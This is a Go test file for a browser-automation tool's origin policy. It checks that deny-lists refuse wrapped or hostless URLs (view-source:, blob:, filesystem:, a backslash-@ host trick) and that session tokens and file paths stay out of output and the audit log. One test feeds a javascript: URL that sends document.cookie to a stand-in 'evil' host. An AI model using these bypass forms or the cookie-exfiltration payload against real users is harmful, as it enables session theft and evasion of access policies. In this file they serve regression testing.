		if code := app.Execute("policy", "init", "-o", cfg, "--print", "--target", "aa11"); code != 0 {
			t.Fatalf("exit = %d", code)
		}
		if !strings.Contains(out.String(), "[policy]") {
			t.Errorf("--print should print the block, got %q", out.String())
		}
		if _, err := os.Stat(cfg); !os.IsNotExist(err) {
			t.Error("--print must not write the file")
		}
	})

	t.Run("a tab with no origin is a usage error", func(t *testing.T) {
		t.Parallel()
		blank := target.Info{ID: "aa11", Title: "New Tab", URL: "about:blank"}
		cfg := filepath.Join(t.TempDir(), "config.toml")
		_, _, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{blank}}, config.Policy{},
			"policy", "init", "-o", cfg, "--target", "aa11", "--json")
		if code != result.ExitUsage {
			t.Errorf("exit = %d, want %d", code, result.ExitUsage)
		}
	})
}

// TestPolicyStateResetsBetweenSessionLines guards the flags-on-App trap: the
// verb is captured per Execute, so a `session` batch must classify each line on
// its own rather than inheriting the previous one's verb.
func TestPolicyStateResetsBetweenSessionLines(t *testing.T) {
	t.Parallel()
	pol := config.Policy{Present: true, Enabled: true, ReadOnly: []string{"*.wiki.test"}}
	tab := target.Info{ID: "aa11", Title: "Wiki", URL: "https://en.wiki.test/Go"}
	app, out, _ := appWithPolicy(&fakeBrowser{tabs: []target.Info{tab}}, pol)
	app.WithInput(strings.NewReader(
		`["text","h1","--target","aa11"]` + "\n" +
			`["click","#x","--target","aa11"]` + "\n" +
			`["text","h1","--target","aa11"]` + "\n"))
	app.Execute("session")

	var codes []any
	for _, line := range strings.Split(strings.TrimSpace(out.String()), "\n") {
		var env map[string]any
		if err := json.Unmarshal([]byte(line), &env); err != nil {
			t.Fatalf("session line is not JSON: %v\n%s", err, line)
		}
		if env["ok"] == true {
			codes = append(codes, "ok")
			continue
		}
		codes = append(codes, env["error"].(map[string]any)["code"])
	}
	want := []any{"ok", result.CodePermissionDenied, "ok"}
	if len(codes) != len(want) {
		t.Fatalf("got %d envelopes, want %d: %v", len(codes), len(want), codes)
	}
	for i := range want {
		if codes[i] != want[i] {
			t.Errorf("line %d = %v, want %v (each session line is classified on its own)", i+1, codes[i], want[i])
		}
	}
}

// HTML makes the read verbs part of the refusal guard too. Reading is exactly
// what the deny-list bypass bought: `html` against a view-source: tab returned
// the full authenticated page, exit 0, and every later verb on that tab was
// permitted as well.
func (b *refusalBrowser) HTML(context.Context, string, string, bool, chrome.QueryOpts) (map[string]any, error) {
	b.acted("HTML")
	return nil, nil
}

// TestDenyListSurvivesAUnparseableURL is H1 at the command boundary.
//
// Every row here exited 0 before the fix, against deny = ["bank.example",
// "*.bank.example"]: the URL had no host net/url would report, the checker read
// that as "matches no pattern", and "matches nothing" was returned as allowed
// whenever no allow-list was configured. The `html` row is the one that hurts —
// a tab already sitting on view-source: of the bank handed back the whole
// authenticated statement.
func TestDenyListSurvivesAUnparseableURL(t *testing.T) {
	t.Parallel()
	deny := config.Policy{
		Present: true, Enabled: true,
		Deny:   []string{"bank.example", "*.bank.example"},
		Source: "/test/config.toml",
	}

	t.Run("navigating to a denied origin Chrome would resolve", func(t *testing.T) {
		t.Parallel()
		for _, dest := range []string{
			`https://bank.example\@evil.io/`,
			"view-source:https://bank.example/x",
			"blob:https://bank.example/2f8a-uuid",
			"filesystem:https://bank.example/temporary/dump",
		} {
			t.Run(dest, func(t *testing.T) {
				t.Parallel()
				env, _, code := runPolicy(t, refusing(t), deny, "open", dest, "--json")
				if code != result.ExitPermission {
					t.Fatalf("open %s exit = %d, want %d — Chrome resolves this to bank.example", dest, code, result.ExitPermission)
				}
				if got := errObj(t, env)["code"]; got != result.CodePermissionDenied {
					t.Errorf("error.code = %v, want permission_denied", got)
				}
			})
		}
	})

	t.Run("reading a tab already parked on a wrapped denied origin", func(t *testing.T) {
		t.Parallel()
		tab := target.Info{ID: "zz99", Title: "Chase — statement", URL: "view-source:https://bank.example/statement?session=SECRET"}
		env, _, code := runPolicy(t, refusing(t, tab), deny, "html", "--target", "zz99", "--json")
		if code != result.ExitPermission {
			t.Fatalf("html exit = %d, want %d — the tab IS the denied origin, wrapped", code, result.ExitPermission)
		}
		if got := errObj(t, env)["origin"]; got != "bank.example" {
			t.Errorf("error.details.origin = %v, want the unwrapped inner origin", got)
		}
	})

	t.Run("view-source of an allowed origin still works", func(t *testing.T) {
		t.Parallel()
		// Unwrapping is a correction to the parse, not a new refusal rule.
		tab := target.Info{ID: "aa11", Title: "App", URL: "view-source:https://app.example.com/dash"}
		_, _, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, allowOnly("app.example.com"),
			"html", "--target", "aa11", "--json")
		if code != 0 {
			t.Errorf("exit = %d, want 0 — view-source: of an allowed origin is still that origin", code)
		}
	})

	t.Run("a genuinely hostless tab is refused under a deny-only policy", func(t *testing.T) {
		t.Parallel()
		tab := target.Info{ID: "cc33", Title: "Notes", URL: "file:///Users/alice/Documents/passwords.html"}
		_, _, code := runPolicy(t, refusing(t, tab), deny, "html", "--target", "cc33", "--json")
		if code != result.ExitPermission {
			t.Errorf("exit = %d, want %d — a deny-list cannot prove this is not the denied origin", code, result.ExitPermission)
		}
	})
}

// TestAuditLogNeverRecordsARawURL is M6.
//
// originOf used to fall back to returning the raw URL when it could not be
// parsed, and that string went straight into the append-only audit log and into
// error.details.origin. The bytes it produced included
// `"origin":"view-source:https://bank.example/statement?session=SECRET"` — a
// session token, written to a file whose entire purpose is to be safe to keep.
func TestAuditLogNeverRecordsARawURL(t *testing.T) {
	t.Parallel()
	const secret = "SECRET-session-token"
	logPath := filepath.Join(t.TempDir(), "audit.log")
	pol := config.Policy{
		Present: true, Enabled: true,
		Deny:     []string{"bank.example", "*.bank.example"},
		AuditLog: logPath,
		Source:   "/test/config.toml",
	}
	tabs := []target.Info{
		{ID: "zz99", Title: "Statement", URL: "view-source:https://bank.example/statement?session=" + secret},
		{ID: "ff44", Title: "Notes", URL: "file:///Users/alice/Documents/" + secret + ".html"},
	}
	if _, _, code := runPolicyOn(t, refusing(t, tabs...), pol, "html", "--target", "zz99", "--json"); code != result.ExitPermission {
		t.Fatalf("the wrapped bank tab must be refused")
	}
	if _, _, code := runPolicyOn(t, refusing(t, tabs...), pol, "html", "--target", "ff44", "--json"); code != result.ExitPermission {
		t.Fatalf("the hostless tab must be refused")
	}
	env, _, _ := runPolicyOn(t, refusing(t, tabs...), pol, "open",
		"javascript:fetch('https://evil/?c='+document.cookie+'"+secret+"')", "--json")

	raw, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatalf("audit log: %v", err)
	}
	if strings.Contains(string(raw), secret) {
		t.Fatalf("the audit log records a raw URL, secrets and all:\n%s", raw)
	}
	if strings.Contains(string(raw), "document.cookie") {
		t.Fatalf("the audit log records a javascript: URL's body:\n%s", raw)
	}
	recs := readAudit(t, logPath)
	if len(recs) != 3 {
		t.Fatalf("want 3 refusal records, got %d: %v", len(recs), recs)
	}
	if recs[0]["origin"] != "bank.example" {
		t.Errorf("a wrapped URL logs its inner origin, got %v", recs[0]["origin"])
	}
	if recs[1]["origin"] != "file:(unparseable)" {
		t.Errorf("a hostless URL logs a scheme placeholder, got %v", recs[1]["origin"])
	}
	if recs[2]["origin"] != "javascript:(unparseable)" {
		t.Errorf("a javascript: URL logs a scheme placeholder, got %v", recs[2]["origin"])
	}
	// error.details carries the same placeholder, not the raw string.
	if got := errObj(t, env)["origin"]; got != "javascript:(unparseable)" {
		t.Errorf("error.details.origin = %v, want the placeholder", got)
	}
	if strings.Contains(errObj(t, env)["message"].(string), secret) {
		t.Errorf("the refusal message leaks the raw URL: %v", errObj(t, env)["message"])
	}
}

// TestExemptVerbsRedactTheTargetTheyResolve is M3.
//
// `use`, `activate`, `close` and `policy init` are Exempt — they never act on
// page content, so they are not origin-checked — but they DO resolve a target,
// and emitting its raw TargetInfo handed back the full URL and title of a tab
// the policy covers, free and side-effect-free. The redaction is at the emit
// boundary rather than in each verb precisely so the next Exempt verb cannot
// forget it.
func TestExemptVerbsRedactTheTargetTheyResolve(t *testing.T) {
	t.Parallel()
	const secret = "SEKRET-session"
	tabs := []target.Info{
		{ID: "aa11", Title: "App", URL: "https://app.example.com/dash"},
		{ID: "zz99", Title: "Chase — Account 4021 statement", URL: "https://bank.example/accounts/4021?session=" + secret},
	}
	assertRedacted := func(t *testing.T, env map[string]any, code int) {
		t.Helper()
		if code != 0 {
			t.Fatalf("exit = %d, want 0 — the tab verbs stay usable under a policy", code)
		}
		tgt, ok := env["target"].(map[string]any)
		if !ok {
			t.Fatalf("envelope has no target: %v", env)
		}
		if tgt["url"] != "https://bank.example" {
			t.Errorf("target.url = %v, want the bare origin", tgt["url"])
		}
		if tgt["title"] != "" {
			t.Errorf("target.title = %v, want it redacted", tgt["title"])
		}
		if tgt["id"] != "zz99" {
			t.Errorf("the tab must stay addressable by id: %v", tgt)
		}
	}
	for _, args := range [][]string{{"activate", "zz99"}, {"close", "zz99"}} {
		t.Run(args[0], func(t *testing.T) {
			t.Parallel()
			full := append(append([]string{}, args...), "--json")
			env, _, code := runPolicy(t, &fakeBrowser{tabs: tabs}, allowOnly("*.example.com"), full...)
			assertRedacted(t, env, code)
		})
	}

	// `use` is the fourth Exempt verb that resolves a target. It needs a
	// sticky-target store, which runPolicy does not wire, so it is run here with
	// one — the point being that it goes through the same emit boundary.
	t.Run("use", func(t *testing.T) {
		t.Parallel()
		out, errb := &bytes.Buffer{}, &bytes.Buffer{}
		d := config.Builtin()
		d.Policy = allowOnly("*.example.com")
		app := New(&fakeBrowser{tabs: tabs}, out, errb).WithDefaults(d).
			WithStickyTarget(func(ConnOpts) string { return "" }, func(ConnOpts, string) error { return nil })
		code := app.Execute("use", "zz99", "--json")
		var env map[string]any
		if err := json.Unmarshal([]byte(strings.TrimSpace(out.String())), &env); err != nil {
			t.Fatalf("stdout is not one JSON value: %v\n%s", err, out.String())
		}
		assertRedacted(t, env, code)
	})

	t.Run("an allowed target is untouched", func(t *testing.T) {
		t.Parallel()
		env, _, _ := runPolicy(t, &fakeBrowser{tabs: tabs}, allowOnly("*.example.com"), "activate", "aa11", "--json")
		tgt := env["target"].(map[string]any)
		if tgt["url"] != tabs[0].URL || tgt["title"] != "App" {
			t.Errorf("an allowed tab must be reported in full: %v", tgt)
		}
	})

	t.Run("with no policy configured nothing changes", func(t *testing.T) {
		t.Parallel()
		env, _, _ := runPolicy(t, &fakeBrowser{tabs: tabs}, config.Policy{}, "activate", "zz99", "--json")
		tgt := env["target"].(map[string]any)
		if tgt["url"] != tabs[1].URL || tgt["title"] != tabs[1].Title {
			t.Errorf("unconfigured, the envelope must be byte-identical to before: %v", tgt)
		}
	})
}

// TestCloseAmbiguityRedactsItsMatches is M4: `close --url <substr>` enumerating
// every match is a free, side-effect-free read of every matching tab's URL and
// title, on a verb that is never origin-checked.
func TestCloseAmbiguityRedactsItsMatches(t *testing.T) {
	t.Parallel()
	const secret = "SEKRET-session"
	tabs := []target.Info{
		{ID: "aa11", Title: "App", URL: "https://app.example.com/a"},
		{ID: "zz99", Title: "Chase — Account 4021", URL: "https://bank.example/a?session=" + secret},
		{ID: "ff44", Title: "Payroll", URL: "file:///Users/alice/a/salary.html"},
	}
	env, _, code := runPolicy(t, &fakeBrowser{tabs: tabs}, allowOnly("*.example.com"), "close", "--url", "/a", "--json")
	if code == 0 {
		t.Fatal("three tabs match and --all was not given; want an ambiguity error")
	}
	e := errObj(t, env)
	blob, err := json.Marshal(e)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(blob), secret) {
		t.Fatalf("the ambiguity error enumerates a non-allowed tab's full URL:\n%s", blob)
	}
	if strings.Contains(string(blob), "salary.html") || strings.Contains(string(blob), "Chase") {
		t.Fatalf("the ambiguity error enumerates non-allowed tabs unredacted:\n%s", blob)
	}
	matches := e["matches"].([]any)
	if len(matches) != 3 {
		t.Fatalf("all three tabs must still be named, got %d", len(matches))
	}
	if m := matches[0].(map[string]any); m["url"] != tabs[0].URL || m["title"] != "App" {
		t.Errorf("the allowed tab must not be redacted: %v", m)
	}
	if m := matches[1].(map[string]any); m["url"] != "https://bank.example" || m["title"] != "" {
		t.Errorf("a non-allowed tab must show its origin only: %v", m)
	}
	if m := matches[2].(map[string]any); m["url"] != "file:(unparseable)" || m["id"] != "ff44" {
		t.Errorf("a hostless tab must show a placeholder and stay addressable: %v", m)
	}
}

// TestListRedactsHostlessTabs is M5. redactTab cleared the title but returned
// the raw URL for a tab with no parseable host — file:// and data:, which are
// exactly the tabs the policy covers least and the ones whose URL IS the
// content.
func TestListRedactsHostlessTabs(t *testing.T) {
	t.Parallel()
	tabs := []target.Info{
		{ID: "aa11", Title: "App", URL: "https://app.example.com/dash"},
		{ID: "ff44", Title: "Passwords", URL: "file:///Users/alice/Documents/passwords.html"},
		{ID: "dd55", Title: "Offer", URL: "data:text/html,<h1>salary 250000</h1>"},
	}
	env, _, code := runPolicy(t, &fakeBrowser{tabs: tabs}, allowOnly("*.example.com"), "list", "--json")
	if code != 0 {
		t.Fatalf("exit = %d, want 0 — list is never refused", code)
	}
	blob, err := json.Marshal(env)
	if err != nil {
		t.Fatal(err)
	}
	for _, leak := range []string{"passwords.html", "salary 250000", "/Users/alice"} {
		if strings.Contains(string(blob), leak) {
			t.Errorf("list leaked %q for a tab the policy does not cover:\n%s", leak, blob)
		}
	}
	rows := env["result"].(map[string]any)["tabs"].([]any)
	if got := rows[1].(map[string]any)["url"]; got != "file:(unparseable)" {
		t.Errorf("file:// row url = %v, want a scheme placeholder", got)
	}
	if got := rows[2].(map[string]any)["url"]; got != "data:(unparseable)" {
		t.Errorf("data: row url = %v, want a scheme placeholder", got)
	}
	for _, i := range []int{1, 2} {
		if got := rows[i].(map[string]any)["title"]; got != "" {
			t.Errorf("row %d title = %v, want it redacted", i, got)
		}
	}
}
